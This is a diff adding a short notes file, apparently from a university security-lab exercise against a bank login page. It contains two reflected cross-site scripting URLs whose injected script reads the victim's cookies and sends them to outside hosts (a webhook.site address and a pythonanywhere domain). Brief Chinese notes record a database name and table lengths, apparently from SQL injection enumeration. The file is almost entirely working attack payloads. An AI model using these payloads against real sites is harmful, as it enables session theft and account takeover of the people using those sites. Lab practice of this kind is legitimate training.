@@ -1,0 +1,14 @@
+
+http://bank.tasks.prak.seclab.cs.msu.ru/login.php?account_name=victorique<script>var i = new Image;var stolenCookie = document.cookie; i.src = 'https://webhook.site/11b2d3ab-6b5b-427b-b451-bca6c18ec85c/stolen?data=' + stolenCookie</script>
+
+http://bank.tasks.prak.seclab.cs.msu.ru/login.php?account_name=victorique <script>var i = new Image;var stolenCookie = document.cookie; i.src = 'http://victorique.pythonanywhere.com/ppp=' + stolenCookie</script>
+
+
+
+库：bank
+
+表3：
+长度17
+
+表4：
+长度19
